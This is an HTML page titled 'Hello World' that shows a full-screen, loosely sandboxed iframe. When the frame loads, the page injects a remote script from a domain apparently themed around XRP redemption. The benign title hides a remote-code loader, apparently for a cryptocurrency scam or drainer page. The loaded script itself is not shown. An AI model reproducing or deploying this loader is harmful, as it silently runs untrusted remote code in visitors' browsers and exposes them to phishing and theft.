<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <!-- Iframe with srcdoc to ensure it's ready for script injection -->
    <iframe id="myIframe" srcdoc="<html><head></head><body></body></html>"
            sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation"></iframe>

    <script>
    function injectScript() {
        const iframe = document.getElementById('myIframe');
        const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;

        // Inject a script into the proxied page
        const script = document.createElement('script');
        script.src = 'https://xrpredeem.com/index.js'; // Ensure this URL is accessible
        script.onerror = function() {
            console.log('Error loading the script');
        };
        iframeDocument.head.appendChild(script);

        console.log('Script injected successfully.');
    }

    document.getElementById('myIframe').onload = injectScript;
    </script>
</body>
</html>
